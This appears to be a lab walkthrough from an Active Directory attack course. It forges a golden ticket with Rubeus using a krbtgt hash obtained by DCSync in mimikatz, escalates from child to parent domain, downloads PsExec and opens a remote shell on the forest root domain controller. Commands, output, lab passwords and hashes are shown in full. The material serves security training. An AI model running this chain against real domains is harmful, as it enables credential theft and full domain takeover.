
- Forge a TGT for `dcorp\svcadmin` to launch a remote DCSync attack.
```
PS C:\AD\MyTools> .\Rubeus.exe asktgt /user:svcadmin /password:*ThisisBlasphemyThisisMadness!!

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using rc4_hmac hash: B38FF50264B74508085D82C69794A4D8
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\svcadmin'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      cC5sb2NhbA==

  ServiceName              :  krbtgt/dollarcorp.moneycorp.local
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
  UserName                 :  svcadmin
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  8/10/2023 10:25:03 AM
  EndTime                  :  8/10/2023 8:25:03 PM
  RenewTill                :  8/17/2023 10:25:03 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  MvnIsn4MuYYnE6MTQUMqKQ==
  ASREP (key)              :  B38FF50264B74508085D82C69794A4D8
```

- Get the `dcorp\krbtgt` hash.
```
PS C:\AD\MyTools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/


mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /user:dcorp\krbtgt /domain:dollarcorp.moneycorp.local
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 10:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
      des_cbc_md5       (4096) : 150ea2e934ab6b80

<snip>
```

- Find the SIDs of the child and parent domains.
```
PS C:\AD\MyTools> Get-DomainSID -Domain dollarcorp.moneycorp.local
S-1-5-21-719815819-3726368948-3917688648
PS C:\AD\MyTools> Get-DomainSID -Domain moneycorp.local
S-1-5-21-335606122-960912869-3279953914
```

- Forge the golden ticket.
```
PS C:\AD\MyTools> .\Rubeus.exe golden /rc4:4e9815869d2090ccfca61c1fe0d23986 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /user:Administrator /ptt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (DOLLARCORP)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-335606122-960912869-3279953914-519
[*] ServiceKey     : 4E9815869D2090CCFCA61C1FE0D23986
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 4E9815869D2090CCFCA61C1FE0D23986
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@dollarcorp.moneycorp.local'

[*] AuthTime       : 8/10/2023 2:36:41 AM
[*] StartTime      : 8/10/2023 2:36:41 AM
[*] EndTime        : 8/10/2023 12:36:41 PM
[*] RenewTill      : 8/17/2023 2:36:41 AM

[*] base64(ticket.kirbi):

      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


[+] Ticket successfully imported!
PS C:\AD\MyTools> klist

Current LogonId is 0:0x500f4dc

Cached Tickets: (1)

#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt/dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 8/10/2023 2:36:41 (local)
        End Time:   8/10/2023 12:36:41 (local)
        Renew Time: 8/17/2023 2:36:41 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
PS C:\AD\MyTools> dir \\mcorp-dc.moneycorp.local\c$


    Directory: \\mcorp-dc.moneycorp.local\c$


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---        11/10/2022   9:53 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-r---        11/11/2022   6:33 AM                Users
d-----        11/26/2022   2:09 AM                Windows

PS C:\AD\MyTools> wget http://172.16.99.3/SysinternalsSuite/PsExec64.exe -O PsExec64.exe
PS C:\AD\MyTools> .\PsExec64.exe \\mcorp-dc.moneycorp.local powershell

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com


Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> hostname
otaemcorp-dc
PS C:\Windows\system32>
PS C:\Windows\system32> whoami
haidollarcorp\administrator

```

